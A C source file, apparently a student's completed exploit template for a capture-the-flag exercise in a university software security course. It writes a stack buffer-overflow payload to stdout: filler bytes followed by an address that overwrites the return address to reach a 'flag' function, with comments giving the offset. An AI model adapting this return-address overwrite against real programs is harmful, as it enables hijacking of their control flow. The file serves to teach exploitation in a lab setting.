/*
 * CTF-1 `vcat0' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>


/* FIXME */
unsigned char payload[] =
	{'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
	'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
	'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
	'H', 'A', 'H', 'A', 0xbb, 0x71, 0x88, 0x0c,
	'H', 'A', 'H', 0xef, 0xbe, 0xad, 0xde};
	//0x0c88724b is memory address of flag 1 function
	//0x0c8871bb is memory address of flag 2 function
	// Need 24 (to reach rbp) plus 4 bytes (28 total) to overwrite into return address

int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
